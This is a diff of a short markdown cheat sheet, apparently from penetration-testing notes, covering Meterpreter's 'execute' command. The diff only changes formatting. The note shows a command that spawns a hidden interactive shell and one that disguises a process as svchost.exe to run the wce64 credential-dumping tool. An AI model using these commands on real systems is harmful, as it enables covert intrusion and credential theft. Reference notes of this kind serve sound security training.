@@ -1,6 +1,6 @@
 # 04 - Execute Process
 
-Search Tag: #metasploit-framework #command-and-control
+Search Tag(s): #metasploit-framework #command-and-control
 
 ## 4.1 - Help Menu
 
@@ -28,11 +28,11 @@ OPTIONS:
 
 ## 4.2 - Usage
 
-* **Spawn Callback Shell**
+* Spawn Callback Shell
 
 `meterpreter > execute -Hicf shell.exe`
 
-* **Dummy Process**
+* Dummy Process
 
 `meterpreter > execute -Hicmd svchost.exe -f /usr/share/windows-resources/wce/wce64.exe -a "-h"`
 
